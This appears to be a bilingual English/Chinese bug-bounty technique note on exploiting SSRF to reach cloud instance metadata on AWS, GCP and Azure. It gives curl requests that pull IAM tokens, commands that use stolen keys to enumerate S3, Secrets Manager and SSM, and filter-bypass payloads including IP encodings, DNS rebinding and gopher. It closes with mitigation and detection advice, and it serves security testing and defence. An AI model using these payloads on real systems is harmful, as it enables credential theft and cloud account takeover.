---
id: ssrf-cloud-metadata
title_en: SSRF to Cloud Instance Metadata
title_zh: SSRF 打云实例元数据
summary_en: Turn a server-side request forgery into cloud credentials by making the application fetch 169.254.169.254. IMDSv1 needs nothing but a URL; IMDSv2 and GCP/Azure need specific headers or methods, which is where most bypass work happens.
summary_zh: 让应用替你去请求 169.254.169.254，把一次 SSRF 变成云凭据。IMDSv1 只要一个 URL；IMDSv2 与 GCP/Azure 需要特定请求头或方法，绕过工作基本都花在这里。
tags: [web, ssrf, cloud, aws, gcp, azure, metadata, bugbounty, privilege-escalation]
tools: [curl, burp, interactsh]
attck: [T1552.005]
platform: [cloud]
difficulty: intermediate
updated: 2026-10-08
---

<!-- lang:en -->
### Why it matters

Cloud instances expose an internal-only HTTP service at `169.254.169.254` (link-local) that hands out instance identity, user-data, and — most importantly — **temporary IAM credentials**. If an application fetches a URL that you control, you can make the application's own network position work for you. This is the single most common path from "SSRF" to "full cloud account takeover" in bug bounty, and it usually pays as critical.

The catch is that the three major clouds have moved past the simplest version, so the work is in the details.

### The three clouds

**AWS — IMDSv1 (the easy one).** Any GET works, no headers:

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
```

The second call returns `AccessKeyId`, `SecretAccessKey`, and `Token`. Then:

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws s3 ls                      # start enumerating
```

**AWS — IMDSv2 (needs a PUT first).** IMDSv2 requires a session token obtained with a PUT request:

```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

If your SSRF cannot choose the HTTP method or set headers, IMDSv2 stops you — unless you can find a second bug (an open redirect, a request smuggler, a gopher-based SSRF) that lets you speak raw HTTP.

**GCP.** Requires the header `Metadata-Flavor: Google`:

```bash
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

**Azure.** Requires `Metadata: true`:

```bash
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

Header-based protections are the reason "SSRF with header control" is worth so much more than a plain URL fetcher. Report the header-control capability as a finding in itself.

### Bypass toolbox

When the app blocks the literal string `169.254.169.254` or filters on it:

- **Alternative representations:** `http://[::ffff:a9fe:a9fe]`, `http://2852039166/`, `http://0xA9FEA9FE/`, `http://169.254.169.254.nip.io/`.
- **Redirects:** point your own server at the metadata endpoint with a 302. Filtering often only checks the URL the user submitted.
- **DNS rebinding:** resolve your hostname to a public IP for the validation check, then to `169.254.169.254` for the actual fetch.
- **URL parsing quirks:** `http://expected.com@169.254.169.254/`, backslashes, `%00`, path normalisation differences between the validator and the HTTP client.
- **Non-HTTP schemes:** `gopher://` (raw TCP — can hit Redis, FastCGI, SMTP), `dict://`, `file://`, `ftp://`. The metadata service is not the only internal target; an unauthenticated Redis is often worth more.

### Where SSRF actually lives

Look for features where the server fetches a URL for you:

- Image/avatar "import from URL", PDF or screenshot generation, Open Graph / link preview, webhook test buttons, RSS or feed importers, XML parsers with external entities (XXE often chains here), video transcoders, "verify your website" flows.

Two useful probes: point the parameter at a Burp Collaborator/interactsh host (does it fetch at all?), then at `http://169.254.169.254/latest/meta-data/` and compare response length and timing for blind cases.

### Escalation after you have credentials

Instance roles are usually over-permissioned. Check in this order:

```bash
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name <role>
aws s3 ls                                   # data
aws secretsmanager list-secrets              # more credentials
aws ssm describe-parameters                   # sometimes plaintext secrets
aws ec2 describe-instances                     # key pairs, user-data
```

User-data (`/latest/user-data`) frequently contains bootstrap secrets: database passwords, API keys, or a join token. Read it even if the role looks uninteresting.

### Mitigation

- Force **IMDSv2** (`HttpTokens: required`) on every instance. This alone kills a large fraction of real-world SSRF-to-credentials paths.
- Restrict the instance role to the minimum it needs; never attach `*` policies.
- Egress firewall rules that block link-local from the application tier, or a metadata proxy that requires an authenticated header.
- Resolve and validate the destination IP **after** DNS resolution, and block private/link-local ranges at the socket level, not by string matching.
- Disable unused URL schemes and redirect following in the HTTP client.
- Put secrets in a secrets manager with short-lived access, not in user-data.

### Detection

- Outbound requests to `169.254.169.254` from anything that is not the instance agent (VPC flow logs, CloudTrail `GetMetadata` patterns via the `ec2.amazonaws.com` principal).
- Unusual `GetCallerIdentity` / `AssumeRole` calls from a role that never made them before.
- CloudTrail from an unexpected IP or user agent — the "attacker using stolen keys from their own laptop" signature.

<!-- lang:zh -->
### 为什么要看它

云实例在 `169.254.169.254`（链路本地地址）上暴露了一个仅限内网访问的 HTTP 服务，它会给出实例身份、user-data，以及最重要的 —— **临时 IAM 凭据**。如果一个应用会去抓取你能控制的 URL，你就能让应用自己的网络位置替你干活。在 bug bounty 里，这是从「一个 SSRF」走到「整个云账号沦陷」最常见的一条路，通常按 critical 计价。

难点在于三大云都已经不再停留在最简单的那个版本，功夫全在细节里。

### 三家云

**AWS —— IMDSv1（最省事的那个）。** 任意 GET 都行，不需要请求头：

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole
```

第二个请求会返回 `AccessKeyId`、`SecretAccessKey`、`Token`。然后：

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws s3 ls                      # 开始枚举
```

**AWS —— IMDSv2（得先发一个 PUT）。** IMDSv2 要求先用 PUT 请求换一个会话令牌：

```bash
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

如果你的 SSRF 不能选择 HTTP 方法、也不能自定义请求头，IMDSv2 就把你挡住了 —— 除非你能找到第二个漏洞（开放重定向、请求走私、基于 gopher 的 SSRF）让你直接讲原始 HTTP。

**GCP。** 必须带 `Metadata-Flavor: Google` 请求头：

```bash
curl -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```

**Azure。** 必须带 `Metadata: true`：

```bash
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

基于请求头的防护，正是「能控制请求头的 SSRF」比「只能传 URL」值钱得多的原因。能控制请求头这件事本身就值得单独报一个发现。

### 绕过工具箱

当应用屏蔽了字面量 `169.254.169.254` 或对它有过滤时：

- **其他写法：** `http://[::ffff:a9fe:a9fe]`、`http://2852039166/`、`http://0xA9FEA9FE/`、`http://169.254.169.254.nip.io/`。
- **重定向：** 用你自己的服务器 302 跳到元数据端点。过滤往往只检查用户提交的那个 URL。
- **DNS rebinding：** 校验时让你的域名解析到公网 IP，真正抓取时再解析到 `169.254.169.254`。
- **URL 解析差异：** `http://expected.com@169.254.169.254/`、反斜杠、`%00`、校验器与 HTTP 客户端之间的路径归一化差异。
- **非 HTTP 协议：** `gopher://`（原始 TCP，可以打 Redis、FastCGI、SMTP）、`dict://`、`file://`、`ftp://`。元数据服务不是唯一的内部目标；一个未授权的 Redis 往往更值钱。

### SSRF 一般藏在哪

找那些「服务器替你去抓 URL」的功能：

- 头像/图片「从 URL 导入」、PDF 或截图生成、OG 链接预览、Webhook 测试按钮、RSS 订阅导入、带外部实体的 XML 解析器（XXE 常常接在这里）、视频转码、「验证你的网站」流程。

两个好用的探针：把参数指向 Burp Collaborator / interactsh 主机（先确认它到底抓不抓），再指向 `http://169.254.169.254/latest/meta-data/`，对盲打场景比较响应长度与耗时。

### 拿到凭据之后怎么扩大

实例角色通常权限过大。按这个顺序查：

```bash
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name <role>
aws s3 ls                                   # 数据
aws secretsmanager list-secrets              # 更多凭据
aws ssm describe-parameters                   # 有时是明文密钥
aws ec2 describe-instances                     # 密钥对、user-data
```

user-data（`/latest/user-data`）里经常有引导阶段的机密：数据库口令、API key、或者加入集群的 token。哪怕角色看起来没意思，也读一下它。

### 缓解

- 所有实例强制 **IMDSv2**（`HttpTokens: required`）。光这一条就砍掉了现实中很大一部分「SSRF 拿凭据」的路径。
- 实例角色按最小权限配置，永远不要挂 `*` 策略。
- 出站防火墙规则禁止应用层访问链路本地地址，或者用需要认证请求头的元数据代理。
- 在 **DNS 解析之后**校验目标 IP，在 socket 层封禁内网/链路本地网段，而不是做字符串匹配。
- HTTP 客户端里禁用不需要的 URL 协议和自动跟随重定向。
- 机密放密钥管理系统并设短有效期，不要写进 user-data。

### 检测

- 来自非实例代理的任何进程向 `169.254.169.254` 发起的出站请求（VPC flow logs；CloudTrail 里通过 `ec2.amazonaws.com` 主体访问元数据的模式）。
- 某个角色此前从未调用过、却突然出现的 `GetCallerIdentity` / `AssumeRole`。
- CloudTrail 里来自异常 IP 或 user-agent 的调用 —— 典型的「攻击者拿偷来的 key 在自己笔记本上用」特征。
